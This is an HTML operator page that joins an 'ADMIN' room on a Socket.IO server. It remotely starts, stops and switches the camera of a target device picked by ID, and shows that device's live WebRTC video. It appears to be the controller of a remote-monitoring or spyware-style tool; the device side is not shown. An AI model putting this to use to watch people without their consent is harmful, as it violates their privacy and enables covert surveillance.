<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Live Camera</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
body{margin:0;background:#000;font-family:sans-serif}
video{width:100%;height:100vh;object-fit:contain}
button{padding:14px;font-size:16px;margin:5px}
</style>
</head>

<body>

<video id="remoteVideo" autoplay playsinline muted></video>

<div style="position:fixed;bottom:10px;width:100%;text-align:center">
    <button onclick="startCamera()">‚ñ∂ START</button>
    <button onclick="switchCamera()">üîÑ SWITCH</button>
    <button onclick="stopCamera()">‚èπ STOP</button>
</div>

<script>

const SERVER = "https://child-v9no.onrender.com";
const DEVICE_ID = new URLSearchParams(location.search).get("id");

let socket = io(SERVER);
let pc;

const config = {
    iceServers:[{urls:"stun:stun.l.google.com:19302"}]
};

socket.on("connect",()=>{
    socket.emit("join-room","ADMIN");
});

/* ===== OFFER ===== */
socket.on("offer", async data => {

    pc = new RTCPeerConnection(config);

    pc.ontrack = e => {
        document.getElementById("remoteVideo").srcObject =
            e.streams[0] || new MediaStream([e.track]);
    };

    pc.onicecandidate = e => {
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    // üî• MAIN FIX
    await pc.setRemoteDescription({
        type:"offer",
        sdp:data.sdp
    });

    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: answer.sdp
    });
});

/* ===== ICE ===== */
socket.on("candidate", async d=>{
    if(pc) await pc.addIceCandidate(d);
});

/* ===== BUTTONS ===== */

function startCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command:"start_video"
    });
}

function stopCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command:"stop_video"
    });

    if(pc){ pc.close(); pc=null; }
    document.getElementById("remoteVideo").srcObject=null;
}

function switchCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command:"switch_camera"
    });
}

</script>
</body>
</html>
